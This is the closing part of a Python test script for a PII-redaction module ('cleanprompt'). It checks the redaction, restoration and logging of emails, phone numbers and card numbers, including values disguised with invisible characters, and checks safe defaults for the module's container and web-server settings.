_real23 = ("import sys; sys.path.insert(0, %r); import scikitplot; before = set(sys.modules); "
           "import scikitplot.cleanprompt, scikitplot.cleanprompt._runtime; "
           "print(sorted(m for m in {m.split('.')[0] for m in set(sys.modules) - before} "
           "if m not in sys.stdlib_module_names and m != 'scikitplot' and not m.startswith('_')))" % (_ROOT,))
if sys.version_info >= (3, 10):
    _out23 = _sp22.run([sys.executable, "-c", _real23], capture_output=True, text=True)
    check("CP-085", "under the real parent package, the submodule adds no third-party module to what the parent loaded",
          _out23.returncode == 0 and _out23.stdout.strip() == "[]", _out23.stdout + _out23.stderr[-300:])
else:
    print("CP-085    SKIP sys.stdlib_module_names needs Python 3.10")
_tests23 = _pkg22 / "tests"
_doc23 = sorted(p.name for p in _tests23.glob("*.py")
                for n in _ast22.walk(_ast22.parse(p.read_text(encoding="utf-8")))
                if (isinstance(n, _ast22.Import) and any(a.name.split(".")[0] == "doctest" for a in n.names))
                or (isinstance(n, _ast22.ImportFrom) and n.level == 0 and (n.module or "").split(".")[0] == "doctest"))
check("CP-086", "no test module runs doctest inside the pytest process; the isolated runner exists",
      _doc23 == [] and (_tests23 / "_isolated.py").is_file(), str(_doc23))
import io as _io23
from scikitplot.cleanprompt import _bridge as _bridge23, FluentCleanPrompt as _FCP23
_started23 = []
_real23p = _bridge23.subprocess.Popen
def _rec23(*a, **k):
    p = _real23p(*a, **k); _started23.append(p); return p
_bridge23.subprocess.Popen = _rec23
try:
    _bridge23.run_command(_FCP23().guard(), [sys.executable, "-c", "import sys; sys.stderr.write('e'); sys.stdout.write(sys.stdin.read())"],
                          "mail ann@example.com", _io23.StringIO(), _io23.StringIO())
finally:
    _bridge23.subprocess.Popen = _real23p
check("CP-087", "run_command closes the command's input, output and error pipes before it returns",
      len(_started23) == 1 and all(getattr(_started23[0], n).closed for n in ("stdin", "stdout", "stderr")))
from scikitplot.cleanprompt import _diagnostics as _diag23
from scikitplot.cleanprompt._capabilities import CapabilityStatus as _CS23, probe as _probe23
from scikitplot.cleanprompt import _engines as _eng23
def _remedy23(*present, model=True):
    # CP-093: the remedy also reads whether spaCy's model is present, so the
    # installation supplied here includes it.
    fake = lambda name: _probe23(name)._replace(
        status=_CS23.AVAILABLE if name in present else _CS23.ABSENT)
    real_model = _eng23._spacy_model_ready
    _diag23.probe = fake; _eng23.probe = fake
    _eng23._spacy_model_ready = lambda _m: model
    try: return _diag23._entity_remedy()
    finally:
        _diag23.probe = _probe23; _eng23.probe = _probe23
        _eng23._spacy_model_ready = real_model
check("CP-088", "the name-detection remedy names the switch in every installation, and NLTK alone names NLTK",
      all("--ner" in _remedy23(*p) for p in ((), ("ner",), ("nltk",), ("ner", "nltk")))
      and _remedy23("nltk").startswith("NLTK is installed") and _remedy23("ner", "nltk").startswith("spaCy is installed"))
import gc as _gc23, logging as _logging23
from scikitplot.cleanprompt import Session as _S23
from scikitplot.cleanprompt._logging import LOGGER_NAME as _LN23, redacting as _red23
_lg23 = _logging23.getLogger(_LN23)
_s23 = _S23(); _s23.encode("mail someone-else@example.com")
with _red23(["topsecret@example.com"]) as _f23:
    del _s23; _gc23.collect()
    _in23 = _f23 in _lg23.filters
check("CP-089", "a vault collected inside a redacting block leaves the block's own filter in place, and exit removes it",
      _in23 and _f23 not in _lg23.filters)
_seen24 = []
_h24 = _logging23.Handler(); _h24.emit = lambda r: _seen24.append((r.getMessage(), getattr(r, "chunks", None)))
_al24 = _logging23.getLogger("scikitplot.cleanprompt.audit"); _lv24 = _al24.level
_al24.addHandler(_h24); _al24.setLevel(_logging23.INFO)
try:
    _g24 = _FCP23().guard(); _safe24 = _g24.outgoing("mail ann@example.com")
    _d24 = _g24.stream(); _o24 = "".join(_d24.feed(c) for c in _safe24)
    _mid24 = [e for e in _seen24 if e[0] == "decoded"]
    _o24 += _d24.flush()
finally:
    _al24.removeHandler(_h24); _al24.setLevel(_lv24)
check("CP-090", "a reply streamed one character at a time records one decoded event, at flush, with the chunk count",
      _o24 == "mail ann@example.com" and _mid24 == [] and [e for e in _seen24 if e[0] == "decoded"] == [("decoded", len(_safe24))])
_tp24 = (_tests23 / "test__patterns.py").read_text(encoding="utf-8")
_cf24 = (_tests23 / "conftest.py").read_text(encoding="utf-8")
check("CP-091", "pattern timing runs in a killable child, payloads are not test ids, and the suite runs at the default log level",
      "in_subprocess(" in _tp24 and "timeout=KILL_AFTER" in _tp24 and "sorted(ADVERSARIAL)" in _tp24
      and "compiled().findall(payload)" not in _tp24 and "_library_default_log_level" in _cf24)
from scikitplot.cleanprompt import _capabilities as _caps25
_real25 = _caps25._installed_version
try:
    _caps25._installed_version = lambda _n: "50.0.2"
    _new25 = _caps25.probe("crypto")
    _caps25._installed_version = lambda _n: "40.0.2"
    _old25 = _caps25.probe("crypto")
finally:
    _caps25._installed_version = _real25
_tiers25 = (_tests23 / "_tiers.py").read_text(encoding="utf-8")
check("CP-092", "a current cryptography is accepted, one below the floor is refused, and a refused tier is not skipped in silence",
      _caps25.TIERS["crypto"].below is None and _new25.available and _new25.supported == "cryptography>=41"
      and _old25.status is _caps25.CapabilityStatus.INCOMPATIBLE
      and "installed_but_refused" in _tiers25
      and "tier is unavailable" not in (_tests23 / "test__crypto.py").read_text(encoding="utf-8"),
      "%s / %s" % (_new25.detail, _old25.detail))

# Round 25: CP-093 .. CP-098 (reproduced on the uploaded tree first: probe_round25.py).
from scikitplot.cleanprompt import CapabilityError as _CE25, _serve as _serve25
from scikitplot.cleanprompt import CleanPromptError as _CPE25
def _machine25(spacy=None, nltk=None, model=True, corpora=()):
    versions = {"spacy": spacy, "nltk": nltk}
    _caps25._installed_version = lambda name: versions.get(name, _real25(name))
    _eng23._spacy_model_ready = lambda _m: model
    _eng23._nltk_missing_corpora = lambda: tuple(corpora)
_real_model25, _real_corpora25 = _eng23._spacy_model_ready, _eng23._nltk_missing_corpora
def _refused25(mode):
    try:
        _eng23.build_detectors(mode, required=True)
    except _CE25 as exc:
        return exc
    return None
try:
    _machine25(spacy="3.8.16", model=False)
    _a25 = _refused25("spacy"); _auto_spacy25 = _eng23.resolve_engine("auto")
    _rep25 = _eng23.describe_engines("en", "spacy")
    _machine25(nltk="3.10.3", corpora=("punkt",))
    _b25 = _refused25("nltk")
    _machine25(spacy="3.8.16", nltk="3.10.3", model=False, corpora=())
    _auto25 = _eng23.resolve_engine("auto", check_assets=True)
finally:
    _caps25._installed_version = _real25
    _eng23._spacy_model_ready, _eng23._nltk_missing_corpora = _real_model25, _real_corpora25
check("CP-093", "an engine without its model or data is not ready: required requests refuse with the download, auto skips it",
      _a25 is not None and _a25.install_hint == "python -m spacy download en_core_web_sm"
      and _b25 is not None and "nltk.download('punkt')" in _b25.install_hint
      and _rep25["ready"] is False and _auto25 == ("nltk",) and _auto_spacy25 == ())
check("CP-088", "(round 25) with spaCy but no model, the remedy is the download and still names the switch",
      "python -m spacy download" in _remedy23("ner", model=False) and "--ner" in _remedy23("ner", model=False))
_calls25 = []
_real_build25 = _eng23.build_detectors
_eng23.build_detectors = lambda **kw: _calls25.append(kw) or []
try:
    from scikitplot.cleanprompt._app import create_app as _create25
    try:
        _create25(ephemeral_secret_key=True, enable_ner=True, ner_engine="nltk", language="tr", model_size="lg")
        _web25 = True
    except _CE25:
        _web25 = None  # web tier absent: reported below
finally:
    _eng23.build_detectors = _real_build25
check("CP-094", "the web app builds entity detectors through build_detectors with every argument it was given",
      _web25 is None or _calls25 == [{"mode": "nltk", "language": "tr", "model": None, "size": "lg", "required": True}],
      str(_calls25))
_df25 = _serve25.container_files(with_ner=True)["Dockerfile"]
check("CP-095", "the image installs the model it runs with, resolved like the runtime",
      "spacy download en_core_web_sm" in _df25 and '"--ner-model", "en_core_web_sm"' in _df25 and "en_core_web_lg" not in _df25)
_all25 = "\n".join(_serve25.container_files(with_ner=True).values())
_runs25 = [l for l in _all25.splitlines() if "docker run" in l]
check("CP-096", "every generated launch line publishes on loopback and no unread setting is generated",
      _runs25 and all("-p 127.0.0.1:" in l for l in _runs25) and "CLEANPROMPT_NER" not in _all25)
_dbg25 = []
for _args25 in ((None, True, False), ("0.0.0.0", False, True), ("192.0.2.10", False, True)):
    try:
        _serve25.resolve_bind(*_args25, debug=True); _dbg25.append(False)
    except _CPE25:
        _dbg25.append(True)
check("CP-097", "debug mode is refused on every reachable bind and allowed on loopback",
      all(_dbg25) and _serve25.resolve_bind(None, False, False, debug=True)[0] == "127.0.0.1")
_obf25 = ["mail ada\u200b@example.com", "mail \uff41\uff44\uff41\uff20\uff45\uff58\uff41\uff4d\uff50\uff4c\uff45\uff0e\uff43\uff4f\uff4d",
          "call +1 555\u00a00100", "call +1\u2011555\u20110100", "ip 192.0.2.\u200b10", "card 4111\u200b1111 1111 1111"]
_ok25 = []
for _t25 in _obf25:
    _r25 = r.redact(_t25)
    _ok25.append(len(_r25.entries) == 1 and _r25.entries[0].original not in _r25.text
                 and restore(_r25.text, _r25.vault).text == _t25)
check("CP-098", "values written with invisible or compatibility characters are found and restored as written",
      all(_ok25), str(_ok25))

from scikitplot.cleanprompt import _nltk as _nltk25
_cmd25 = _nltk25.download_command(["averaged_perceptron_tagger", "maxent_ne_chunker"])
try:
    import nltk as _real_nltk25  # noqa: F401 - only to know whether the loader can be exercised
    class _Stale25:
        data = type("D", (), {"find": staticmethod(lambda path: path)})()
        @staticmethod
        def pos_tag(tokens): raise LookupError("averaged_perceptron_tagger_eng")
        @staticmethod
        def ne_chunk(tagged): raise LookupError("maxent_ne_chunker_tab")
    _saved25 = (_nltk25._RESOURCES, _nltk25._build_chunker)
    _nltk25._RESOURCES, _nltk25._build_chunker = {}, (lambda: None)
    try:
        _stale25 = _nltk25.missing_data(_Stale25())
    finally:
        _nltk25._RESOURCES, _nltk25._build_chunker = _saved25
except ImportError:
    _stale25 = ["averaged_perceptron_tagger", "maxent_ne_chunker"]  # loader not exercisable without NLTK
check("CP-100", "NLTK data this NLTK cannot load is not ready, and the remedy names the current and older packages",
      _stale25 == ["averaged_perceptron_tagger", "maxent_ne_chunker"]
      and all("nltk.download('%s')" % n in _cmd25 for n in ("averaged_perceptron_tagger_eng", "averaged_perceptron_tagger",
                                                            "maxent_ne_chunker_tab", "maxent_ne_chunker")))

from scikitplot.cleanprompt import FluentCleanPrompt as _FCP26
from scikitplot.cleanprompt._packs import normalise_field as _nf26
_c26 = _FCP26().packs("all").materialize()
_env26 = "NO\u200bTE=x\nDB_PASSWORD=pw-1\nOTHER=y\n"
_e26 = _c26.encode_text(_env26, "env", name="s.env")
_ok26 = (_e26.text.count("\n") == _env26.count("\n") and "pw-1" not in _e26.text
         and _c26.decode(_e26.text) == _env26)
check("CP-102", "a zero-width character early in a record file leaves its lines and separators intact",
      _ok26, repr(_e26.text))
_hdr26 = "n\u200bame,phone\nAnn Lee,+1 555 010 4477\n"
_h26 = _c26.encode_text(_hdr26, "csv", name="s.csv")
check("CP-103", "an invisible character inside a field name still names the field",
      _nf26("n\u200bame") == "name" and "Ann Lee" not in _h26.text and _c26.decode(_h26.text) == _hdr26,
      repr(_h26.text))

# API: encode/decode and the portable handle.
safe, handle = encode("Mail ada@example.com about the Acme deal", hide=["Acme"])
rt = decode(safe, handle)
check("API-001", "encode hides and decode restores exactly",
      "ada@example.com" not in safe and "Acme" not in safe
      and rt == "Mail ada@example.com about the Acme deal", safe)
import json as _json
wire = Handle.load(_json.loads(_json.dumps(handle.export())))
check("API-002", "handle survives a JSON round trip", decode(safe, wire) == rt)
check("API-003", "handle repr discloses nothing", "ada@example.com" not in repr(handle))
with session() as s:
    one, two = s.encode("mail ada@example.com"), s.encode("again ada@example.com")
check("API-004", "placeholders stay stable across session turns",
      one.split()[-1] == two.split()[-1], one + " / " + two)

print()
print("=" * 78); print("INVARIANTS AT SCALE"); print("=" * 78)

rng = random.Random(20260920)
frag_hot = ["ada@example.com","b.c+d@sub.example.co.uk","https://example.com/a?b=1#c","+1 555 010 4477",
            "4242 4242 4242 4242","192.168.1.10","2001:db8:85a3:0:0:8a2e:370:7334","00:1B:44:11:3A:B7",
            "123-45-6789","GB82 WEST 1234 5698 7654 32","AKIAIOSFODNN7EXAMPLE"]
frag_cold = ["hello","world","2024-01-15","12345678","numpy 1.26.4","\n","\t"," ","Ünïcodé \U0001f389","[EMAIL-1]","<<x>>"]
bad_rt = bad_leak = bad_idem = 0
N = 3000
t0 = time.monotonic()
for _ in range(N):
    parts = [rng.choice(frag_hot if rng.random() < .45 else frag_cold) for _ in range(rng.randint(0, 18))]
    text = " ".join(parts)
    res = r.redact(text, extra_terms=["world"] if rng.random() < .3 else None)
    if restore(res.text, res.vault).text != text: bad_rt += 1
    if any(e.original not in text or e.original in res.text for e in res.entries): bad_leak += 1
    if r.redact(res.text).text != res.text: bad_idem += 1
dt = time.monotonic() - t0
check("I1", "round trip over %d random documents" % N, bad_rt == 0, "%d failures" % bad_rt)
# CP-098 at scale: the same hot values salted with invisible and compatibility
# characters at random positions. No visible character of a value may survive.
_salt25 = ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u00ad", "\u202e")
_v_rt = _v_leak = 0
for _ in range(1000):
    value = rng.choice(frag_hot)
    salted = "".join(c + (rng.choice(_salt25) if rng.random() < .2 and i < len(value) - 1 else "")
                     for i, c in enumerate(value))
    text = "before " + salted + " after"
    res = r.redact(text)
    if restore(res.text, res.vault).text != text: _v_rt += 1
    if res.text.replace("before ", "").replace(" after", "").strip() == salted: _v_leak += 1
check("V25", "1000 salted values: each found and restored exactly", _v_rt == 0 and _v_leak == 0,
      "%d round-trip, %d leak failures" % (_v_rt, _v_leak))
check("I2", "no detected surface survives", bad_leak == 0, "%d failures" % bad_leak)
check("I7", "idempotent re-redaction", bad_idem == 0, "%d failures" % bad_idem)
print("           (%d documents in %.2fs)" % (N, dt))

junk_ok = True
for _ in range(2000):
    t = "".join(rng.choice(string.printable) for _ in range(rng.randint(0, 300)))
    try:
        res = r.redact(t); restore(res.text, res.vault)
    except Exception as e:
        junk_ok = False; print("   crash on junk:", type(e).__name__, e); break
check("I8", "arbitrary printable junk never crashes", junk_ok)

print()
print("=" * 78); print("PERFORMANCE — linear, not quadratic"); print("=" * 78)
for n in (1000, 4000, 16000):
    text = "contact user@example.com and https://example.com/x " * n
    t0 = time.monotonic(); res = r.redact(text); t1 = time.monotonic()
    restore(res.text, res.vault); t2 = time.monotonic()
    print("  %7d chars  redact %6.3fs  restore %6.3fs  entries %d" % (len(text), t1-t0, t2-t1, res.stats.entries))

print()
print("TOTAL FAILURES:", len(fails), fails if fails else "")
sys.exit(1 if fails else 0)
